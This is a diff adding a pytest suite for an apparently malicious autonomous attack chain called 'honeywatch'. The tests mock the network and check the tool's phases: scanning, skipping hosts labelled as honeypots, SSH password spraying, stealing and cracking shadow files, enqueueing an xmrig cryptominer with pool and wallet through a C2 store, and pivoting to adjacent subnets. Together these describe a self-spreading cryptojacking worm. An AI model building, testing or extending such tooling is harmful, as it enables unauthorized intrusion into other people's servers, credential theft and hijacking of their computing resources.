@@ -1,0 +1,429 @@
+"""Tests for the autonomous chain orchestrator.
+
+Network is never touched: phases that hit the wire are overridden on a
+subclass so the loop logic, state threading, and the pivot subnet parser are
+exercised deterministically.
+"""
+
+from __future__ import annotations
+
+import pytest
+
+from honeywatch.chain import (
+    ChainConfig,
+    ChainOrchestrator,
+    ChainPhase,
+    ChainState,
+    _adjacent_subnets,
+)
+from honeywatch.hashcrack import CrackedHash, HashCrackResult
+from honeywatch.opsec import AuthMethods
+from honeywatch.spray import SprayResult
+
+
+def test_adjacent_subnets_parses_ip_o_addr():
+    out = (
+        "1: lo    inet 127.0.0.1/8 scope host lo\n"
+        "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n"
+        "3: eth1    inet 192.168.1.20/24 brd 192.168.1.255 scope global eth1\n"
+        "4: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n"
+    )
+    nets = _adjacent_subnets(out)
+    # loopback skipped, RFC1918 kept, /16 docker collapsed to /24 for pivoting.
+    # canonical network base (host IP zeroed), not the host address itself.
+    assert nets == ["10.0.0.0/24", "192.168.1.0/24", "172.17.0.0/24"]
+
+
+def test_adjacent_subnets_skips_loopback_and_linklocal():
+    out = (
+        "1: lo    inet 127.0.0.1/8 scope host lo\n"
+        "2: eth0    inet 169.254.1.5/24 scope global eth0\n"
+    )
+    assert _adjacent_subnets(out) == []
+
+
+def test_adjacent_subnets_tight_cidr_widened_to_24():
+    out = "2: eth0    inet 10.5.5.7/30 brd 10.5.5.7 scope global eth0\n"
+    assert _adjacent_subnets(out) == ["10.5.5.0/24"]
+
+
+class _MockChain(ChainOrchestrator):
+    """Orchestrator whose phases don't touch the network.
+
+    Simulates a two-round growth loop: round 1 pivots to a new subnet, round 2
+    finds nothing new and the chain stops on growth-exhausted.
+    """
+
+    def __init__(self, config):
+        super().__init__(config)
+        self._round_hosts = {1: [("10.0.0.5", 22)], 2: []}
+
+    def phase_recon(self):
+        self._emit(ChainPhase.RECON, "mock recon")
+        # pretend recon discovered these hosts and wrote them to the store.
+
+    def phase_enumerate(self):
+        hosts = self._round_hosts.get(self.state.round, [])
+        self.state.hosts = hosts
+        self.state.sprayable = hosts
+        self._emit(ChainPhase.ENUMERATE, f"{len(hosts)} hosts")
+
+    def phase_spray(self):
+        seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
+        for ip, port in self.state.sprayable:
+            key = (ip, port, "root", "pw")
+            if key not in seen:
+                self.state.credentials.append({"ip": ip, "port": port,
+                                                "user": "root", "password": "pw"})
+                seen.add(key)
+        self._emit(ChainPhase.SPRAY, f"{len(self.state.credentials)} creds")
+
+    def phase_foothold(self):
+        existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
+        for c in self.state.credentials:
+            key = (c["ip"], c["port"], c["user"])
+            if key not in existing:
+                self.state.footholds.append((c["ip"], c["port"], c["user"], c["password"]))
+                existing.add(key)
+        self._emit(ChainPhase.FOOTHOLD, f"{len(self.state.footholds)} footholds")
+
+    def phase_escalate(self):
+        self._emit(ChainPhase.ESCALATE, "mock escalate")
+
+    def phase_persist(self):
+        self.state.enqueued = [(f[0], f[1]) for f in self.state.footholds]
+        self._emit(ChainPhase.PERSIST, f"{len(self.state.enqueued)} enqueued")
+
+    def phase_pivot(self):
+        # Round 1 discovers a new subnet; round 2 discovers nothing -> stops.
+        if self.state.round == 1:
+            self.cfg.targets = ["10.0.1.0/24"]
+            self._emit(ChainPhase.PIVOT, "found 10.0.1.0/24")
+        else:
+            self.cfg.targets = []
+            self._emit(ChainPhase.PIVOT, "no new subnets")
+
+
+def test_chain_loops_then_stops_on_growth_exhausted():
+    cfg = ChainConfig(targets=["10.0.0.0/24"], max_rounds=3, pool="p", wallet="w")
+    orch = _MockChain(cfg)
+    state = orch.run()
+    # Two rounds ran (round 1 pivoted, round 2 exhausted growth).
+    assert state.round == 2
+    assert state.stopped is True
+    assert "growth exhausted" in state.stop_reason
+    assert len(state.credentials) == 1
+    assert len(state.footholds) == 1
+    assert len(state.enqueued) == 1
+    # Each phase was logged in both rounds.
+    phases_seen = {e["phase"] for e in state.log}
+    for p in ("recon", "enumerate", "spray", "foothold", "escalate", "persist", "pivot"):
+        assert p in phases_seen
+
+
+def test_chain_state_note_records_round():
+    s = ChainState()
+    s.round = 1
+    s.note(ChainPhase.RECON, "hi", extra="x")
+    assert s.log[0] == {"phase": "recon", "msg": "hi", "round": 1, "extra": "x"}
+
+
+def test_chain_config_defaults():
+    cfg = ChainConfig()
+    assert cfg.payload_id == "xmrig"
+    assert cfg.max_rounds == 3
+    assert cfg.target_labels == {"real", "likely_real"}
+    # exec_mode was removed: the chain only enqueues; the worker owns exec mode.
+    assert not hasattr(cfg, "exec_mode")
+    # wordlist was removed: no crack-fallback phase exists; escalate uses
+    # hashcrack_wordlist instead.
+    assert not hasattr(cfg, "wordlist")
+
+
+# --------------------------------------------------------------------------- #
+# Real phase-method tests (network deps monkeypatched).
+# These exercise the actual phase_* bodies -- not the _MockChain overrides --
+# so the store side-effects, state threading, and the A1-A4 / B1-B3 fixes are
+# covered.
+# --------------------------------------------------------------------------- #
+
+
+class _FakeStore:
+    """In-memory stand-in for Store; only the methods the chain calls."""
+
+    def __init__(self, query_rows=None, creds=None):
+        self._rows = query_rows or []
+        self._creds = creds or []
+        self.upserted = False
+
+    def query(self, limit=100, label=None, min_confidence=0.0):
+        rows = [r for r in self._rows if r.get("confidence", 0) >= min_confidence]
+        if label is not None:
+            rows = [r for r in rows if r.get("label") == label]
+        return rows[:limit]
+
+    def query_credentials(self, ip=None, port=None, user=None, limit=1000):
+        out = list(self._creds)
+        if ip is not None:
+            out = [c for c in out if c["ip"] == ip]
+        return out[:limit]
+
+    def upsert_credential(self, ip, port, user, password, banner=None,
+                          attempts=0, source="crack"):
+        self.upserted = True
+        self._creds.append({"ip": ip, "port": port, "user": user,
+                            "password": password, "source": source})
+
+
+class _FakeManifest:
+    pass
+
+
+class _FakeOp:
+    id = "op-test-1"
+
+
+class _FakeScore:
+    final_label = "real"
+
+
+def test_phase_enumerate_filters_labels_and_prechecks(monkeypatch):
+    cfg = ChainConfig(targets=["10.0.0.0/24"], min_confidence=0.7)
+    orch = ChainOrchestrator(cfg)
+    fake = _FakeStore(query_rows=[
+        {"ip": "10.0.0.1", "port": 22, "label": "real", "confidence": 0.9},
+        {"ip": "10.0.0.2", "port": 22, "label": "honeypot", "confidence": 0.95},
+        {"ip": "10.0.0.3", "port": 22, "label": "likely_real", "confidence": 0.75},
+    ])
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+
+    def fake_auth(ip, port, user, timeout_s=6.0):
+        am = AuthMethods(ip=ip, port=port, user=user)
+        am.offers_password = ip.endswith(".1") or ip.endswith(".3")
+        return am
+    monkeypatch.setattr("honeywatch.opsec.auth_methods", fake_auth)
+
+    orch.phase_enumerate()
+    # honeypot-label row filtered out by target_labels; real + likely_real kept
+    assert ("10.0.0.1", 22) in orch.state.hosts
+    assert ("10.0.0.3", 22) in orch.state.hosts
+    assert ("10.0.0.2", 22) not in orch.state.hosts
+    # only the two that offer password auth are sprayable
+    assert orch.state.sprayable == [("10.0.0.1", 22), ("10.0.0.3", 22)]
+
+
+def test_phase_spray_persists_and_accumulates(monkeypatch):
+    cfg = ChainConfig(users=["admin"], passwords=["pw1"])
+    orch = ChainOrchestrator(cfg)
+    orch.state.sprayable = [("10.0.0.1", 22), ("10.0.0.2", 22)]
+    fake = _FakeStore()
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+
+    sprayed = []
+    def fake_spray(password, hosts, **kw):
+        sprayed.append(password)
+        return [SprayResult(ip=h.ip, port=h.port,
+                            success=(password == "pw1" and h.ip == "10.0.0.1"),
+                            user="admin", password=password, attempts=1)
+                for h in hosts]
+    monkeypatch.setattr("honeywatch.spray.spray_targets", fake_spray)
+
+    orch.state.round = 1
+    orch.phase_spray()
+    assert sprayed == ["pw1"]
+    assert len(orch.state.credentials) == 1
+    assert orch.state.credentials[0]["ip"] == "10.0.0.1"
+    assert fake.upserted is True
+
+
+def test_phase_spray_reuse_creds_prepends_recovered_round2(monkeypatch):
+    cfg = ChainConfig(users=["admin"], passwords=["newpw"])
+    orch = ChainOrchestrator(cfg)
+    orch.state.sprayable = [("10.0.0.5", 22)]
+    fake = _FakeStore(creds=[{"ip": "10.0.0.1", "port": 22,
+                              "user": "root", "password": "oldpw"}])
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+
+    sprayed = []
+    monkeypatch.setattr("honeywatch.spray.spray_targets",
+                        lambda password, hosts, **kw: sprayed.append(password) or [])
+
+    orch.state.round = 2
+    orch.phase_spray()
+    # recovered "oldpw" is prepended (fleet growth), then configured "newpw"
+    assert sprayed[0] == "oldpw"
+    assert "newpw" in sprayed
+
+
+def test_phase_foothold_skips_already_confirmed(monkeypatch):
+    cfg = ChainConfig()
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]  # already confirmed
+    fake = _FakeStore(creds=[
+        {"ip": "10.0.0.1", "port": 22, "user": "root", "password": "pw"},
+        {"ip": "10.0.0.2", "port": 22, "user": "root", "password": "pw"},
+    ])
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+
+    grabbed = []
+    def fake_grab(ip, port, user, password, stash_dir=None, **kw):
+        grabbed.append(ip)
+        if ip.endswith(".2"):
+            return {"ip": ip, "shadow_path": f"{stash_dir}/{ip}/shadow"}
+        return {"ip": ip, "error": "nope"}
+    monkeypatch.setattr("honeywatch.hashcrack.grab_shadow", fake_grab)
+
+    orch.phase_foothold()
+    # already-confirmed .1 is never re-grabbed (no target-side noise)
+    assert "10.0.0.1" not in grabbed
+    assert "10.0.0.2" in grabbed
+    assert ("10.0.0.2", 22, "root", "pw") in orch.state.footholds
+    assert ("10.0.0.1", 22, "root", "pw") in orch.state.footholds
+
+
+def test_phase_escalate_appends_cracked_to_state(monkeypatch, tmp_path):
+    stash = tmp_path / "shadow_stash"
+    cfg = ChainConfig(hashcrack_wordlist=str(tmp_path / "wl"))
+    cfg.shadow_stash = str(stash)
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
+    orch.state.credentials = [{"ip": "10.0.0.1", "port": 22,
+                               "user": "root", "password": "pw"}]
+    fake = _FakeStore()
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+
+    host_stash = stash / "10.0.0.1"
+    host_stash.mkdir(parents=True)
+    (host_stash / "shadow").write_text("x")
+
+    def fake_crack(path, wl, tool="hashcat"):
+        r = HashCrackResult(tool=tool)
+        r.cracked = [CrackedHash(user="bob", hash="h", password="bobpw", success=True)]
+        return r
+    monkeypatch.setattr("honeywatch.hashcrack.crack_shadow", fake_crack)
+
+    orch.phase_escalate()
+    # A1: offline-cracked creds now land in state.credentials, not just the store
+    assert any(c["user"] == "bob" for c in orch.state.credentials)
+    assert len(orch.state.credentials) == 2  # original root + cracked bob
+    assert fake.upserted is True
+
+
+def test_phase_persist_enqueues_and_tracks(monkeypatch):
+    cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w")
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
+    fake = _FakeStore()
+    monkeypatch.setattr(orch, "_store", lambda: fake)
+    monkeypatch.setattr("honeywatch.ops.build_manifest",
+                        lambda pid, targets, variables, apply_evasion=None,
+                               allow_unsafe_vars=False: _FakeManifest())
+    monkeypatch.setattr("honeywatch.ops.enqueue_operation",
+                        lambda c2, manifest: _FakeOp())
+    monkeypatch.setattr("honeywatch.c2.store.C2Store", lambda db_path: object())
+
+    orch.phase_persist()
+    # A4: tracks enqueued targets, not a fictional "deployed" fleet
+    assert orch.state.enqueued == [("10.0.0.1", 22)]
+    assert not hasattr(orch.state, "deployed")
+
+
+def test_phase_persist_aborts_without_pool_for_miner(monkeypatch):
+    cfg = ChainConfig(payload_id="xmrig", pool="", wallet="")
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.1", 22, "root", "pw")]
+    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())
+
+    orch.phase_persist()
+    assert orch.state.enqueued == []
+    assert any(e["phase"] == "persist" and "ABORT" in e["msg"]
+               for e in orch.state.log)
+
+
+def test_phase_pivot_accumulates_subnets(monkeypatch):
+    cfg = ChainConfig()
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.5", 22, "root", "pw")]
+
+    def fake_ssh(ip, port, user, pw, key, command, timeout_s=15.0):
+        return (0, "2: eth0    inet 10.0.0.5/24 brd 10.0.0.255 scope global eth0\n", None)
+    monkeypatch.setattr("honeywatch.chain._ssh_exec", fake_ssh)
+    orch.phase_pivot()
+    assert orch.state.pivoted_subnets == ["10.0.0.0/24"]
+    assert orch.cfg.targets == ["10.0.0.0/24"]
+
+    # second pivot from a different foothold accumulates (A2), not resets
+    orch.state.footholds = [("192.168.1.20", 22, "root", "pw")]
+    monkeypatch.setattr("honeywatch.chain._ssh_exec",
+                        lambda ip, port, user, pw, key, command, timeout_s=15.0:
+                        (0, "2: eth1    inet 192.168.1.20/24 brd 192.168.1.255 "
+                            "scope global eth1\n", None))
+    orch.phase_pivot()
+    assert orch.state.pivoted_subnets == ["10.0.0.0/24", "192.168.1.0/24"]
+
+
+def test_phase_pivot_dedups_already_pivoted_subnets(monkeypatch):
+    cfg = ChainConfig()
+    orch = ChainOrchestrator(cfg)
+    orch.state.footholds = [("10.0.0.5", 22, "root", "pw")]
+    orch.state.pivoted_subnets = ["10.0.0.0/24"]  # already pivoted once
+    monkeypatch.setattr("honeywatch.chain._ssh_exec",
+                        lambda ip, port, user, pw, key, command, timeout_s=15.0:
+                        (0, "2: eth0    inet 10.0.0.5/24 scope global eth0\n", None))
+    orch.phase_pivot()
+    # the already-known subnet is not re-queued for recon
+    assert orch.cfg.targets == []
+    assert orch.state.pivoted_subnets == ["10.0.0.0/24"]
+
+
+def test_phase_recon_runs_pipeline_scan(monkeypatch):
+    cfg = ChainConfig(targets=["10.0.0.0/24"])
+    orch = ChainOrchestrator(cfg)
+    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())
+
+    class FakePipe:
+        async def scan(self, targets, tool="masscan", ports=None, rate=None,
+                       max_hosts=None, skip_vpn_check=False, resume=False,
+                       progress=False):
+            return [_FakeScore(), _FakeScore()]
+    monkeypatch.setattr("honeywatch.pipeline.Pipeline",
+                        lambda cfg, store=None: FakePipe())
+    monkeypatch.setattr("honeywatch.config.load_config", lambda x: object())
+
+    orch.phase_recon()
+    assert any(e["phase"] == "recon" and "scored 2" in e["msg"]
+               for e in orch.state.log)
+
+
+def test_phase_recon_threads_operator_config_path(monkeypatch):
+    """C4: recon must load_config(cfg.config_path), not hard-coded None, so the
+    operator's config.toml scan tuning is honored through the chain."""
+    cfg = ChainConfig(targets=["10.0.0.0/24"], config_path="/etc/honeywatch/prod.toml")
+    orch = ChainOrchestrator(cfg)
+    monkeypatch.setattr(orch, "_store", lambda: _FakeStore())
+
+    loaded = []
+    class FakePipe:
+        async def scan(self, *a, **kw):
+            return []
+    monkeypatch.setattr("honeywatch.pipeline.Pipeline", lambda c, store=None: FakePipe())
+    monkeypatch.setattr("honeywatch.config.load_config",
+                        lambda path: loaded.append(path) or object())
+
+    orch.phase_recon()
+    assert loaded == ["/etc/honeywatch/prod.toml"]
+
+
+def test_chain_round_banner_is_logged_under_round_not_recon():
+    """C5: the `=== round N ===` delimiter must not be filed under the recon
+    phase, so log filtering by phase stays clean."""
+    cfg = ChainConfig(targets=[], max_rounds=1, skip_vpn_check=True)
+    orch = ChainOrchestrator(cfg)
+    # Force an immediate stop: no targets -> recon no-ops, pivot no-ops, loop
+    # exits on growth-exhausted after one round.
+    state = orch.run()
+    round_entries = [e for e in state.log if e.get("phase") == "round"]
+    assert any("=== round 1 ===" in e["msg"] for e in round_entries)
+    # no recon-phase entry carries the round delimiter
+    assert not any(e.get("phase") == "recon" and "===" in e["msg"]
+                   for e in state.log)
